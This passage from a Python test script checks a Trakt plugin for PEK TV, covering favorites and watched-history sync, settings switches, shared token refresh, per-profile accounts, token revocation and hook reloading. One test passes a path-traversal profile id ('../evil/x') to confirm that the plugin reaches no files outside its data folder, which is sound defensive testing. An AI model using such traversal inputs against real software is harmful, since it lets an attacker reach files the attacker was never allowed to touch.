    NET.fav_acts = "2026-10-27T11:00:00.000Z"
    r = hook({"type": "tick"})
    gone = [i for e in fx(r, "favorites.set_many") if e["value"] is False for i in e["items"]]
    check("a favorite removed on Trakt is removed in PEK TV", [(i["kind"], i["title"]) for i in gone] == [("movie", "Alien")] and gone[0]["at"] > 0, r["effects"])
    NET.fav_acts = None
    NET.favs = []

    # Trakt without last_activities (or an error) still works: the history is asked for
    NET.log.clear()
    json.dump({}, open(os.path.join(DATA, "sync.json"), "w"))
    r = hook({"type": "tick"})
    check("a first tick with no remembered state imports", r["ok"] and any(e["op"] == "watched.set_many" for e in r["effects"]), r)

    # -------------------------------------------------------------------------------------- manual marks
    NET.log.clear()
    items = [{"kind": "movie", "title": "Heat", "year": 1995, "season": 0, "episode": 0},
             {"kind": "episode", "title": "Severance", "year": 0, "season": 1, "episode": 4},
             {"kind": "episode", "title": "Severance", "year": 0, "season": 1, "episode": 5}]
    hook({"type": "watched", "items": items, "value": True})
    c = calls("/sync/history")[-1]
    body = c[5]
    check("marking watched -> one /sync/history call", c[2] == "/sync/history" and len([x for x in NET.log if x[2] == "/sync/history"]) == 1)
    check("movies and episodes are grouped (show -> season -> episodes)", body["movies"][0]["ids"] == {"trakt": 7} and body["shows"][0]["seasons"][0]["episodes"][0]["number"] == 4 and len(body["shows"][0]["seasons"][0]["episodes"]) == 2, body)
    check("marked watched carries a watched_at", "watched_at" in body["movies"][0])
    hook({"type": "watched", "items": items[:1], "value": False})
    check("marking unwatched -> /sync/history/remove", len(calls("/sync/history/remove")) == 1 and "watched_at" not in calls("/sync/history/remove")[0][5]["movies"][0])

    # -------------------------------------------------------------------------------------- settings
    s = json.load(open(os.path.join(DATA, "settings.json"))) if os.path.exists(os.path.join(DATA, "settings.json")) else {}
    json.dump({"scrobble": False, "push": False, "pull": False, "ratings": False, "favorites": False}, open(os.path.join(DATA, "settings.json"), "w"))
    NET.log.clear()
    hook(dict(movie, type="play", position=0))
    hook({"type": "watched", "items": items, "value": True})
    r = hook({"type": "app_start"})
    check("switches turn scrobbling, marks, import and ratings off", not calls("/scrobble") and not calls("/sync/history") and r["effects"] == [], [c[2] for c in NET.log])

    # -------------------------------------------------------------------------------------- two sessions, one refresh token
    sys.path.insert(0, os.path.join(PLUGINS, "trakt"))
    import trakt_core as tc
    host = g.build_host_module("trakt", os.path.join(PLUGINS, "trakt"), json.load(open(os.path.join(PLUGINS, "trakt", "plugin.json"))))
    json.dump({"access_token": "OLD", "refresh_token": "RT0", "expires_at": time.time() - 10}, open(os.path.join(DATA, "auth.json"), "w"))
    a, b = tc.Trakt(host), tc.Trakt(host)            # the screen's and the hook's copies, both holding the expired token
    NET.log.clear()
    ta = a.token()
    tb = b.token()
    check("a refresh by one session is reused by the other (one /oauth/token call)", ta == "AT2" and tb == "AT2" and len(calls("/oauth/token")) == 1, [c[2] for c in NET.log])
    sys.path.pop(0)

    # -------------------------------------------------------------------------------------- one Trakt account per profile
    fresh = time.time() + 86400
    def put(name, obj):
        json.dump(obj, open(os.path.join(DATA, name), "w"))
    def get(name, default=None):
        try:
            return json.load(open(os.path.join(DATA, name)))
        except (OSError, ValueError):
            return default
    put("settings.json", {})
    put("auth.json", {"access_token": "AT-P1", "refresh_token": "RT-P1", "expires_at": fresh})
    put("queue.json", [])
    play = dict(movie, type="play", position=600)
    NET.log.clear()
    r = hook(play, ctx={"profile": "p2"})
    check("a profile that never connected Trakt scrobbles nothing, even while p1 is connected", r["ok"] and not calls("/scrobble"), [c[2] for c in NET.log])
    put("p2.auth.json", {"access_token": "AT-P2", "refresh_token": "RT-P2", "expires_at": fresh})
    NET.log.clear()
    hook(play, ctx={"profile": "p2"})
    c = calls("/scrobble/start")
    check("profile p2 scrobbles with its own token", len(c) == 1 and c[0][4].get("Authorization") == "Bearer AT-P2", [x[4] for x in c])
    NET.log.clear()
    hook(play, ctx={"profile": "p1"})
    c = calls("/scrobble/start")
    check("profile p1 keeps using its own token (the account linked before profiles existed)", len(c) == 1 and c[0][4].get("Authorization") == "Bearer AT-P1", [x[4] for x in c])
    NET.log.clear()
    hook(play)
    c = calls("/scrobble/start")
    check("a PEK TV that tells no profile means p1", len(c) == 1 and c[0][4].get("Authorization") == "Bearer AT-P1", [x[4] for x in c])
    NET.fail_scrobble_stop = True
    hook(dict(movie, type="stop", position=5700), ctx={"profile": "p2"})
    NET.fail_scrobble_stop = False
    check("a watch p2 could not send is queued for p2 only", len(get("p2.queue.json", [])) == 1 and get("queue.json") == [], (get("p2.queue.json"), get("queue.json")))
    put("settings.json", {"scrobble": False})
    NET.log.clear()
    hook(play, ctx={"profile": "p2"})
    check("switches are per profile (p1 turned scrobbling off, p2 still scrobbles)", len(calls("/scrobble/start")) == 1)
    put("settings.json", {})
    NET.log.clear()
    hook(play, ctx={"profile": "../evil/x"})
    check("a profile id cannot be used to reach other files", not calls("/scrobble") and not os.path.exists(os.path.join(TMP, "evil")) and not os.path.exists(os.path.join(DATA, "..", "evil.auth.json")))
    r = flutter({"op": "open", "id": "trakt", "fresh": True, "ctx": {"profile": "p1"}})
    check("the screen of p1 shows p1's account", bool(find(r.get("tree"), "Disconnect")), texts(r.get("tree")))
    r = flutter({"op": "open", "id": "trakt", "ctx": {"profile": "p3"}})
    check("the same screen, opened for a profile with no account, offers Connect", bool(find(r.get("tree"), "Connect to Trakt")) and not find(r.get("tree"), "Disconnect"), texts(r.get("tree")))
    r = flutter({"op": "open", "id": "trakt", "ctx": {"profile": "p2"}})
    check("and for p2 it shows p2's account again", bool(find(r.get("tree"), "Disconnect")), texts(r.get("tree")))
    flutter({"op": "close", "id": "trakt"})
    NET.log.clear()
    r = hook({"type": "profile_removed"}, ctx={"profile": "p2"})
    rv = calls("/oauth/revoke")
    check("deleting a profile revokes its Trakt token", r["ok"] and len(rv) == 1 and rv[0][5].get("token") == "AT-P2", [(c[2], c[5]) for c in NET.log])
    check("and empties its files", not get("p2.auth.json", {}).get("access_token") and get("p2.queue.json", {}) == {})
    check("another profile's account is untouched", get("auth.json", {}).get("access_token") == "AT-P1")
    NET.log.clear()
    hook({"type": "profile_removed"}, ctx={"profile": "p9"})
    check("deleting a profile that never connected Trakt calls nothing", not calls("/oauth"))
    check("pek_ui.profile() hands out only the id", pf.pek_ui.profile.__doc__ is not None and tc.clean_profile("p1") == "p1" and tc.clean_profile("") == "p1" and tc.clean_profile("a/b.c d") == "abcd" and len(tc.clean_profile("x" * 99)) == 24)
    put("auth.json", {"access_token": "AT-P1", "refresh_token": "RT-P1", "expires_at": fresh})

    # -------------------------------------------------------------------------------------- an update reloads the hooks
    json.dump({"scrobble": True, "push": True, "pull": True}, open(os.path.join(DATA, "settings.json"), "w"))
    hp = os.path.join(PLUGINS, "trakt", "hooks.py")
    src = open(hp).read().replace('t.scrobble("start", ev, ev["percent"])', 't.scrobble("pause", ev, ev["percent"])')
    time.sleep(0.05)
    open(hp, "w").write(src)
    os.utime(hp, (time.time() + 5, time.time() + 5))
    NET.log.clear()
    hook(dict(movie, type="play", position=0))
    check("an updated hooks.py is picked up without a restart", len(calls("/scrobble/pause")) == 1 and not calls("/scrobble/start"))
finally:
    shutil.rmtree(TMP, ignore_errors=True)

print()
print("ALL PASSED" if not failures else "FAILED: %d -> %s" % (len(failures), ", ".join(failures)))
sys.exit(1 if failures else 0)
